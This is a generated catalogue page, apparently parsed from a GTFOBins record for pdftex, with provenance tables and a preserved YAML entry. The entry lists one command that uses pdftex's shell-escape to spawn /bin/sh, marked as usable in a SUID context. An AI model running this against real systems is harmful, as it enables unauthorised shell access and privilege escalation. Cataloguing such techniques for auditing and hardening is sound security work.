---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# pdftex

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `pdftex` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdftex` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [pdftex](../../tools/linux/pdftex.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | pdftex |
| name | pdftex |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/pdftex/ |

## Preserved Source Material

```yaml
_body: ''
_name: pdftex
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdftex
functions:
  shell:
  - code: pdftex --shell-escape '\write18{/bin/sh}\end'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
